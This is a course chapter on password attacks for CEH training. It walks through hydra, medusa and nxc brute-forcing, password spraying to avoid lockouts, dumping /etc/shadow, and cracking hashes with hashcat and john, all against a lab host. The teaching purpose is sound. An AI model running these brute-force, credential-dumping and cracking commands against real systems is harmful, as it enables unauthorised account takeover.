# 10 — Password Attacks

> **What you'll learn:** the two families of password attack (online vs offline), how to guess logins against a live service with `hydra`/`medusa`/`nxc` *without locking accounts*, what a hash actually is and how to identify one, and how to crack captured hashes offline with `hashcat` and `john` using wordlists and rules — ending in a full **capture → identify → crack** workflow.
> **Prerequisites:** [09 — Metasploit Framework](09-metasploit.md). ⬅️ [Course index](README.md)

This chapter maps to CEH **[Module 06 — System Hacking](../modules/06-system-hacking/)** (the "Gaining Access" phase). Everything runs against your **[lab](../labs/)** — Metasploitable2 at `192.168.56.20` (login `msfadmin`/`msfadmin`). Crack **only** hashes you generated or captured in your own lab.

---

## Online vs offline — the big picture

There are two ways to attack a password, and knowing which you're doing decides every tool choice:

| | **Online** | **Offline** |
|---|---|---|
| What you do | Try login after login against a **live service** (SSH, web form, RDP) | Crack a **stolen hash** on your own machine |
| Speed | Slow — limited by the network and the server (tens–hundreds/sec) | Fast — millions to billions of guesses/sec on your GPU |
| Noise | **Loud** — every failure is logged; can trigger **account lockout** and alerts | **Quiet** — the target never sees a single attempt |
| Needs | A reachable service | The hash first (you must already have captured it) |

So the rule is: **online to get a foothold, offline once you've stolen hashes.** Offline is faster *and* quieter because you guess against a copy on your own hardware — no server to rate-limit you, no log entry per attempt. But you can only go offline once you have the hash (from `/etc/shadow`, the wire, or a database).

## What is a hash?

A **hash** is a one-way scramble of a password. Feed `password123` into a hash function (MD5, SHA-1, etc.) and you always get the same fixed-length gibberish out — but there's no "unscramble" button. Systems store the hash, not your password; at login they hash what you typed and compare.

```bash
echo -n 'password123' | md5sum
# You should see: 482c811da5d5b4bc6d497ffa98491e38  -
```

"Cracking" a hash means **guessing** the input, hashing each guess, and looking for a match — you never reverse it.

A **salt** is a random value mixed in *before* hashing, unique per password, so two users with the same password get different hashes — killing precomputed "rainbow table" lookups. Linux `/etc/shadow` hashes are salted (the salt sits inside the `$...$` string); old Windows **NTLM** is **unsalted**, which is exactly why it stays so crackable.

## Online attacks with Hydra

**Hydra** throws username/password guesses at a live service. A **wordlist** is just a text file of candidate passwords, one per line — Kali ships the famous `rockyou.txt` (14 million leaked real passwords).

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz    # first time only: rockyou ships compressed
# Guess the SSH password for a known user (msfadmin) on Metasploitable2
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20 -t 4
# You should see: [22][ssh] host: 192.168.56.20  login: msfadmin  password: msfadmin
```

Key flags:

| Flag | Meaning |
|---|---|
| `-l user` / `-L users.txt` | single username / list of usernames |
| `-p pass` / `-P wordlist.txt` | single password / password list |
| `-t 4` | run 4 parallel tasks (**lower = gentler**, less likely to lock accounts) |
| `-w 30` | wait 30s between tries (throttle to dodge rate limits) |
| `-f` | stop at the first valid login |
| `-V` | verbose — show every attempt |

### Hydra against an HTTP POST login form

Web logins need Hydra's `http-post-form` module. Metasploitable2 hosts **DVWA** at `/dvwa/`. You give Hydra three colon-separated parts: the **path**, the **POST body** (with `^USER^` and `^PASS^` as placeholders), and a **failure string** that appears only when login fails.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 \
  http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"
# You should see the valid password once a guess stops producing "Login failed"
```

Find the field names and failure text by submitting the form once in the browser with **Burp** or DevTools open (see [08 — Web hacking](08-web-hacking.md)). Get the failure string wrong and Hydra reports either everything or nothing as valid.

## Medusa and NetExec — the same idea, other tools

**Medusa** is a parallel login brute-forcer like Hydra; **NetExec** (`nxc`, the maintained successor to CrackMapExec) shines at **spraying** many hosts/protocols — especially SMB in Active Directory (chapter 11) — but both handle SSH too:

```bash
medusa -h 192.168.56.20 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh   # -M = module
nxc ssh 192.168.56.20 -u msfadmin -p msfadmin
# You should see: SSH  192.168.56.20  22  [+] msfadmin:msfadmin
```

**Password spraying** flips the logic: try **one** common password across **many** users instead of many passwords against one user. It stays under per-account lockout thresholds — the smart way to attack online at scale.

## Be lockout-aware

Online guessing is loud and destructive if you're careless:

- **Account lockout** — many systems disable an account after N failed logins (e.g. 5). Blast `rockyou.txt` at one account and you'll lock it, alert the defender, and get nothing. Keep `-t` low, throttle with `-w`, and prefer **spraying**.
- **Know the policy first.** In a real engagement ask for the lockout threshold; the lab's Metasploitable2 won't lock, so it's safe to practice on.
- **This is why offline wins** — once you have the hashes, lockouts, logs, and rate limits all disappear.

## Identifying a hash

Before you can crack a hash you must know its **type** (that sets the tool's mode). Two identifiers ship with Kali:

```bash
hashid '482c811da5d5b4bc6d497ffa98491e38'   # lists candidates: MD5, NTLM, ... (likeliest first)
hash-identifier                             # interactive — paste a hash, get likely types
```

Clues you can read yourself — the **prefix** tells you a lot:

| Looks like | Type | Hashcat `-m` |
|---|---|---|
| 32 hex chars, no prefix | MD5 **or** NTLM | 0 / 1000 |
| 40 hex chars | SHA-1 | 100 |
| `$1$...` | md5crypt (old Linux) | 500 |
| `$6$...` | sha512crypt (modern `/etc/shadow`) | 1800 |
| `$krb5tgs$...` | Kerberos TGS (Kerberoasting) | 13100 |
| `user::DOMAIN:...` | NetNTLMv2 (Responder capture) | 5600 |

Identifiers **guess** — `hashid` can't tell MD5 from NTLM (both 32 hex). Context decides: from a Windows SAM it's NTLM; from a Linux web app it's probably MD5.

## Offline cracking with Hashcat

**Hashcat** is the GPU-accelerated cracker. You tell it the hash type with `-m` (mode) and the attack style with `-a` (`-a 0` = straight wordlist). Memorize these modes — they cover almost everything in CEH:

| `-m` | Hash type | Where you meet it |
|---|---|---|
| `0` | MD5 | Web app databases |
| `100` | SHA-1 | Older web apps |
| `1000` | NTLM | Windows SAM / AD |
| `1800` | sha512crypt (`$6$`) | Modern Linux `/etc/shadow` |
| `5600` | NetNTLMv2 | Responder wire captures |
| `13100` | Kerberos TGS-REP | Kerberoasting (AD) |
| `22000` | WPA-PBKDF2-PMKID+EAPOL | Wi-Fi handshakes |

```bash
# Straight wordlist attack on an MD5 hash you generated in the lab
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# You should see, once solved:  482c811...e38:password123

hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt   # same command, NTLM mode
hashcat -m 0 hash.txt --show                                     # show cracked (from potfile)
```

Full mode reference: the official [Hashcat example-hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows one sample of every format.

## Offline cracking with John the Ripper

**John** ("JtR") is the CPU-based cracker. It **auto-detects** most formats, so it's great when you're unsure. Three flags do 90% of the work:

| Flag | Meaning |
|---|---|
| `--wordlist=FILE` | use this wordlist |
| `--format=NAME` | force a hash format (e.g. `nt`, `sha512crypt`, `md5crypt`) |
| `--show` | print passwords John has already cracked |

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt          # auto-detect + rockyou
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt # force a format
john --show hashes.txt        # print what's cracked so far
john --list=formats           # every format John knows
```

For Linux hashes, first **combine** `/etc/passwd` and `/etc/shadow` so John has the usernames:

```bash
unshadow passwd.txt shadow.txt > crackme.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt
```

## Wordlists and rules

**Wordlists** are your ammunition. Two sources cover most needs:

```bash
ls -l /usr/share/wordlists/rockyou.txt   # rockyou — already on Kali (unzip once)
sudo apt install seclists                # SecLists — huge curated wordlist collection
ls /usr/share/seclists
# You should see: Passwords/  Usernames/  Discovery/  Fuzzing/ ...
```

A **rule** is a mini-recipe that mutates each wordlist entry on the fly — capitalize, append digits, swap `a→@`, add `!` — so `password` also becomes `Password1`, `p@ssw0rd`, `password!`, and so on. It multiplies a small wordlist into millions of realistic variations for almost no cost. Kali ships Hashcat's rules; `best64.rule` is the classic starting point:

```bash
# Wordlist + rules = the best bang for your buck
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt   # John's built-in rules
```

## Crafting custom wordlists — crunch and cewl

Sometimes rockyou won't do and you need a **targeted** list. **crunch** generates every combination from a pattern or charset — ideal for known formats (PINs, a fixed password scheme):

```bash
crunch 4 4 0123456789 -o pins.txt    # every 4-digit PIN (0000–9999)
crunch 6 6 -t Pass@@ -o custom.txt    # "Pass" + two lowercase letters (@ = lowercase placeholder)
# syntax: crunch <min-len> <max-len> [charset] -o <outfile>
```

**cewl** crawls a website and builds a wordlist from the **words on its pages** — company jargon, product names, staff surnames make surprisingly good passwords:

```bash
cewl -d 2 -m 5 -w site-words.txt http://192.168.56.20/
# -d 2 = crawl depth 2   -m 5 = keep words 5+ chars   -w = output file
# Then feed it to a cracker, ideally with rules:
hashcat -m 0 -a 0 hash.txt site-words.txt -r /usr/share/hashcat/rules/best64.rule
```

## Full workflow — capture → identify → crack

The whole chapter in one flow, using only lab data. Get a shell on Metasploitable2 (via the SSH login above or a [Metasploit](09-metasploit.md) session), then:

```bash
# 1. CAPTURE — dump the credential stores on the target (msfadmin can sudo)
sudo cat /etc/passwd > passwd.txt
sudo cat /etc/shadow > shadow.txt          # copy both back to Kali (scp)
# 2. IDENTIFY — a '$1$...' field = md5crypt (old);  '$6$...' = sha512crypt
hashid '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid'   # -> md5crypt
# 3. CRACK — John auto-detects; combine passwd+shadow first
unshadow passwd.txt shadow.txt > crackme.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt
john --show crackme.txt                     # You should see: msfadmin:msfadmin:...
#    Prefer Hashcat? Use the matching mode ($1$ = 500, $6$ = 1800):
hashcat -m 500 -a 0 shadow.txt /usr/share/wordlists/rockyou.txt
```

That's the loop you'll repeat forever: **get the hash, name the hash, crack the hash.** In Active Directory ([chapter 11](11-active-directory.md)) the captures change (Kerberoast `$krb5tgs$`, Responder NetNTLMv2) but the three steps are identical.

## Common beginner mistakes

- **Blasting rockyou at one account online.** You'll lock it and alert the defender. Keep `-t` low, throttle, or **spray** one password across many users instead.
- **Wrong Hashcat mode.** MD5 (`-m 0`) and NTLM (`-m 1000`) look identical (32 hex). Pick the wrong `-m` and it "runs" but never cracks. Identify first, use context.
- **Forgetting to unzip rockyou.** `rockyou.txt.gz` won't work as a wordlist — `sudo gunzip` it once.
- **Skipping `unshadow`.** Feeding raw `/etc/shadow` to John loses the usernames; combine `passwd`+`shadow` first.
- **Wrong failure string in `http-post-form`.** If it doesn't exactly match what a failed login shows, Hydra reports garbage. Verify it in the browser/Burp first.
- **Cracking hashes that aren't yours.** Only crack what you generated or captured in *your* lab. Anything else is illegal.

## ✅ Practice task

1. Generate an MD5 hash of a rockyou word (`echo -n 'letmein' | md5sum`), save it to `hash.txt`, run `hashid` on it, then crack it with `hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`.
2. Run Hydra against SSH on `192.168.56.20` for `msfadmin` with `-t 4`; confirm it finds `msfadmin`. Note how slow it is versus step 1.
3. From a shell on Metasploitable2, capture `/etc/passwd` and `/etc/shadow`, `unshadow` them, and crack with John. Run `john --show`.
4. Install SecLists (`sudo apt install seclists`) and build a site wordlist with `cewl` against `http://192.168.56.20/`, then re-run a crack with `-r /usr/share/hashcat/rules/best64.rule`.
5. In your notes, write one sentence on **why offline cracking was faster and quieter** than the online Hydra run.

## Next

➡️ [11 — Active Directory](11-active-directory.md): where these skills go pro — Kerberoasting, AS-REP roasting, Responder captures, and passing hashes instead of cracking them.

## Sources

- Hashcat — example hashes (every mode's format): https://hashcat.net/wiki/doku.php?id=example_hashes · wiki: https://hashcat.net/wiki/
- John the Ripper (Openwall): https://www.openwall.com/john/
- THC-Hydra: https://github.com/vanhauser-thc/thc-hydra
- NetExec (nxc): https://www.netexec.wiki/
- SecLists: https://github.com/danielmiessler/SecLists
- CEH Module 06 — System Hacking: [../modules/06-system-hacking/](../modules/06-system-hacking/)
